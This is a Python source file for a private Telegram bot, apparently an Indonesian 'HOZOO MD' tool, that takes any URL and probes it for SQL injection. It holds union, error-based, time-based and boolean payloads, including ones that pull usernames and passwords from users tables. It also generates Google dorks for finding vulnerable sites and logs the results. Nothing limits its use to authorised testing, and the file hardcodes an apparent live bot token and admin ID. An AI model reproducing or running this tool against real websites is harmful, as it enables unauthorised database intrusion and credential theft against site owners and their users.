#!/usr/bin/env python3
# Telegram SQL Injection Bot - HOZOO MD
# Running on Linux / Termux / VPS
# Token: 8744588912:AAETV4GQZEiMLA8vQorQA7X6-gXz_JSnJMA

import telebot
import requests
import sqlite3
import re
import time
import threading
import random
import string
from urllib.parse import urlparse, quote_plus
from telebot import types

# ============ KONFIGURASI ============
BOT_TOKEN = "8744588912:AAETV4GQZEiMLA8vQorQA7X6-gXz_JSnJMA"
CHAT_ID = "8530130542"
ADMIN_ID = [8530130542]

bot = telebot.TeleBot(BOT_TOKEN)

# Database hasil injection
conn = sqlite3.connect('inject_results.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS hasil
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  target TEXT, payload TEXT, result TEXT, waktu TEXT)''')
conn.commit()

# ============ PAYLOAD SQL INJECTION ============
PAYLOADS = {
    "basic": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "1' OR '1'='1",
        "1' OR 1=1 --",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
    ],
    "union": [
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT NULL,username,password FROM users--",
        "' UNION SELECT database(),user(),version()--",
        "' UNION SELECT table_name,column_name FROM information_schema.columns--",
    ],
    "time_based": [
        "' OR SLEEP(5)--",
        "' OR BENCHMARK(1000000,MD5('a'))--",
        "1' AND SLEEP(5)--",
        "' WAITFOR DELAY '00:00:05'--",
    ],
    "error_based": [
        "' AND extractvalue(1,concat(0x7e,database()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "boolean": [
        "' AND '1'='1",
        "' AND '1'='2",
        "1' AND (SELECT 'a' FROM users LIMIT 1)='a'",
    ]
}

# ============ HEADERS UNTUK BYPASS ============
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

# ============ FUNGSI UTAMA ============
def test_sql_injection(url, param, payload, method="GET"):
    """Testing SQL Injection pada target"""
    target_url = f"{url}?{param}={quote_plus(payload)}" if "?" not in url else f"{url}&{param}={quote_plus(payload)}"
    
    try:
        if method.upper() == "GET":
            response = requests.get(target_url, headers=HEADERS, timeout=10)
        else:
            response = requests.post(url, data={param: payload}, headers=HEADERS, timeout=10)
        
        # Deteksi indikasi vulnerable
        indicators = [
            "mysql", "sql", "syntax", "error", "warning", 
            "mysqli", "database", "odbc", "driver", "ora-",
            "microsoft ole db", "unclosed quotation mark",
            "you have an error in your sql syntax",
            "division by zero"
        ]
        
        vulnerable = False
        for ind in indicators:
            if ind.lower() in response.text.lower():
                vulnerable = True
                break
        
        return {
            'vulnerable': vulnerable,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'response_preview': response.text[:500]
        }
    except Exception as e:
        return {'vulnerable': False, 'error': str(e)}

def run_sqlmap_style(url, full_mode=False):
    """Simulasi sqlmap style scanning"""
    results = []
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    # Ekstrak parameter dari URL
    params = []
    if parsed.query:
        for param in parsed.query.split('&'):
            params.append(param.split('=')[0])
    
    if not params:
        params = ['id', 'q', 'search', 'cat', 'page', 'user', 'username', 'pass', 'password']
    
    for param in params:
        for ptype, payloads in PAYLOADS.items():
            for payload in payloads[:3]:  # Limit untuk kecepatan
                result = test_sql_injection(base_url, param, payload)
                if result['vulnerable']:
                    results.append({
                        'parameter': param,
                        'payload': payload,
                        'type': ptype,
                        'result': result
                    })
    return results

# ============ COMMAND HANDLER ============
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.chat.id not in ADMIN_ID:
        bot.reply_to(message, "❌ Akses ditolak! Bot ini private.")
        return
    
    menu = """
🔥 *HOZOO MD - SQL INJECTION BOT* 🔥

📌 *COMMAND LIST:*

/sqlscan <url> - Scan SQL Injection dasar
/sqlfull <url> - Full scan semua parameter
/sqlpayloads - Tampilkan semua payload
/sqlcheck <url> <param> - Test parameter spesifik
/sqlunion <url> - Test UNION injection
/sqlblind <url> - Blind SQL injection test
/sqltime <url> - Time-based injection test
/sqlerror <url> - Error-based injection test
/sqldork <query> - Generate Google dorks
/sqlreport - Lihat hasil scan tersimpan
/sqlclear - Hapus semua hasil
/sqlhelp - Menu ini

📌 *CONTOH:*
/sqlscan http://target.com/page.php?id=1
/sqlfull http://target.com/search.php?q=test
/sqlcheck http://target.com/product.php?id=1 id

💀 *MADE BY HOZOO MD* 💀
"""
    bot.reply_to(message, menu, parse_mode='Markdown')

@bot.message_handler(commands=['sqlscan'])
def sql_scan(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Usage: /sqlscan <url>")
            return
        
        target_url = args[1]
        bot.reply_to(message, f"🔍 Scanning: {target_url}\n⏳ Mohon tunggu...")
        
        results = []
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if parsed.query:
            for param in parsed.query.split('&'):
                param_name = param.split('=')[0]
                for payload in PAYLOADS['basic'][:5]:
                    res = test_sql_injection(base_url, param_name, payload)
                    if res['vulnerable']:
                        results.append(f"✅ Vulnerable: {param_name} | Payload: {payload}")
        else:
            test_params = ['id', 'page', 'cat', 'product', 'user']
            for param in test_params:
                for payload in PAYLOADS['basic'][:3]:
                    res = test_sql_injection(base_url, param, payload)
                    if res['vulnerable']:
                        results.append(f"✅ Vulnerable: {param} | Payload: {payload}")
        
        if results:
            msg = "🔥 *VULNERABLE FOUND:* 🔥\n\n" + "\n".join(results)
        else:
            msg = "❌ No vulnerability detected with basic payloads.\nTry /sqlfull for deeper scan."
        
        bot.reply_to(message, msg, parse_mode='Markdown')
        
        # Simpan ke database
        cursor.execute("INSERT INTO hasil VALUES (NULL, ?, ?, ?, datetime('now'))",
                      (target_url, "basic_scan", str(results)))
        conn.commit()
        
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

@bot.message_handler(commands=['sqlfull'])
def sql_full(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Usage: /sqlfull <url>")
            return
        
        target_url = args[1]
        status_msg = bot.reply_to(message, f"💀 Full scan started: {target_url}\n⏳ This may take a while...")
        
        results = run_sqlmap_style(target_url, full_mode=True)
        
        if results:
            msg = "💀 *SQL INJECTION VULNERABILITIES:* 💀\n\n"
            for r in results[:20]:
                msg += f"📌 Parameter: `{r['parameter']}`\n"
                msg += f"🔧 Type: {r['type']}\n"
                msg += f"💉 Payload: `{r['payload'][:50]}`\n"
                msg += f"📊 Status: {r['result'].get('status_code', 'N/A')}\n\n"
            
            cursor.execute("INSERT INTO hasil VALUES (NULL, ?, ?, ?, datetime('now'))",
                          (target_url, "full_scan", str(len(results))))
            conn.commit()
        else:
            msg = "❌ No vulnerabilities found after full scan."
        
        bot.edit_message_text(msg, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

@bot.message_handler(commands=['sqlpayloads'])
def show_payloads(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    msg = "💉 *PAYLOAD DATABASE:* 💉\n\n"
    for ptype, payloads in PAYLOADS.items():
        msg += f"📁 *{ptype.upper()}* ({len(payloads)} payloads)\n"
        msg += f"`{payloads[0]}`\n"
        msg += f"`{payloads[1] if len(payloads) > 1 else ''}`\n\n"
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['sqlcheck'])
def sql_check(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "⚠️ Usage: /sqlcheck <url> <parameter>")
            return
        
        target_url = args[1]
        parameter = args[2]
        
        results = []
        for ptype, payloads in PAYLOADS.items():
            for payload in payloads[:5]:
                res = test_sql_injection(target_url, parameter, payload)
                if res['vulnerable']:
                    results.append(f"✅ {ptype}: {payload[:50]}")
        
        if results:
            bot.reply_to(message, "🔥 *VULNERABLE!*\n\n" + "\n".join(results), parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ Parameter appears safe.")
            
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

@bot.message_handler(commands=['sqlunion'])
def sql_union(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: /sqlunion <url>")
        return
    
    target_url = args[1]
    bot.reply_to(message, f"🔧 Testing UNION injection on {target_url}...")
    
    results = []
    for payload in PAYLOADS['union']:
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if parsed.query:
            param = parsed.query.split('=')[0]
            res = test_sql_injection(base_url, param, payload)
            if res['vulnerable'] and "union" in res['response_preview'].lower():
                results.append(f"✅ UNION works: {payload}")
    
    if results:
        bot.reply_to(message, "💀 *UNION INJECTION SUCCESSFUL!*\n\n" + "\n".join(results), parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ UNION injection failed.")

@bot.message_handler(commands=['sqltime'])
def sql_time(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: /sqltime <url>")
        return
    
    target_url = args[1]
    bot.reply_to(message, "⏰ Testing time-based injection (wait 10-15 sec)...")
    
    start = time.time()
    for payload in PAYLOADS['time_based']:
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if parsed.query:
            param = parsed.query.split('=')[0]
            test_sql_injection(base_url, param, payload)
    
    elapsed = time.time() - start
    
    if elapsed > 10:
        bot.reply_to(message, f"✅ Possible time-based vulnerability detected! Response took {elapsed:.1f} seconds.")
    else:
        bot.reply_to(message, f"❌ No time-based vulnerability. Response took {elapsed:.1f} seconds.")

@bot.message_handler(commands=['sqlerror'])
def sql_error(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: /sqlerror <url>")
        return
    
    target_url = args[1]
    bot.reply_to(message, "🐛 Testing error-based injection...")
    
    for payload in PAYLOADS['error_based']:
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if parsed.query:
            param = parsed.query.split('=')[0]
            res = test_sql_injection(base_url, param, payload)
            if res['vulnerable']:
                bot.reply_to(message, f"💀 *ERROR-BASED VULNERABLE!*\nPayload: `{payload}`\n\nPreview:\n{res['response_preview'][:300]}", parse_mode='Markdown')
                return
    
    bot.reply_to(message, "❌ No error-based vulnerability found.")

@bot.message_handler(commands=['sqldork'])
def sql_dork(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    args = message.text.split()
    query = " ".join(args[1:]) if len(args) > 1 else "php?id="
    
    dorks = [
        f'inurl:{query}',
        f'inurl:{query} intitle:index.of',
        f'inurl:{query} site:.id',
        f'inurl:{query} ext:php',
        f'inurl:{query} "mysql_fetch"',
        f'inurl:{query} "you have an error"',
        f'inurl:{query} "Warning: mysql"',
        f'intitle:sql error inurl:{query}',
        f'inurl:{query} "union select"',
        f'site:.com inurl:{query}'
    ]
    
    msg = "🔍 *GOOGLE DORKS FOR SQL INJECTION:* 🔍\n\n"
    for i, dork in enumerate(dorks, 1):
        msg += f"{i}. `{dork}`\n"
    
    msg += f"\n📌 Use: https://www.google.com/search?q={quote_plus(dorks[0])}"
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['sqlreport'])
def sql_report(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    cursor.execute("SELECT target, payload, result, waktu FROM hasil ORDER BY id DESC LIMIT 20")
    rows = cursor.fetchall()
    
    if not rows:
        bot.reply_to(message, "📭 Belum ada hasil scan.")
        return
    
    msg = "📊 *SCAN REPORT HISTORY:* 📊\n\n"
    for row in rows:
        msg += f"🎯 Target: {row[0]}\n"
        msg += f"💉 Payload: {row[1][:50]}\n"
        msg += f"📝 Result: {row[2][:50]}\n"
        msg += f"⏰ Waktu: {row[3]}\n\n"
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['sqlclear'])
def sql_clear(message):
    if message.chat.id not in ADMIN_ID:
        return
    
    cursor.execute("DELETE FROM hasil")
    conn.commit()
    bot.reply_to(message, "🗑️ All scan results cleared.")

@bot.message_handler(commands=['sqlhelp'])
def sql_help(message):
    send_welcome(message)

# ============ INLINE QUERY ============
@bot.inline_handler(lambda query: True)
def inline_query(query):
    if query.from_user.id not in ADMIN_ID:
        return
    
    try:
        q = query.query.lower()
        if q.startswith("scan "):
            url = q[5:]
            results_list = []
            
            scanned = run_sqlmap_style(url, full_mode=False)
            for r in scanned[:10]:
                result = types.InlineQueryResultArticle(
                    id=str(random.randint(1000,9999)),
                    title=f"Vuln on {r['parameter']}",
                    description=f"Type: {r['type']}",
                    input_message_content=types.InputTextMessageContent(
                        f"🔥 SQL Injection Found!\nParameter: {r['parameter']}\nPayload: {r['payload']}\nType: {r['type']}"
                    )
                )
                results_list.append(result)
            
            if results_list:
                bot.answer_inline_query(query.id, results_list)
            else:
                empty = types.InlineQueryResultArticle(
                    id="0",
                    title="No vulnerability found",
                    description="Try different URL",
                    input_message_content=types.InputTextMessageContent("❌ No SQL injection found.")
                )
                bot.answer_inline_query(query.id, [empty])
                
    except Exception as e:
        pass

# ============ RUN BOT ============
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║      HOZOO MD - SQL INJECTION BOT     ║
    ║         PRIVATE & UNRESTRICTED        ║
    ╠═══════════════════════════════════════╣
    ║  Status: RUNNING                      ║
    ║  Token: 8744588912:AAETV4GQZEiMLA...  ║
    ║  Admin: 8530130542                    ║
    ╚═══════════════════════════════════════╝
    """)
    bot.infinity_polling(timeout=10)
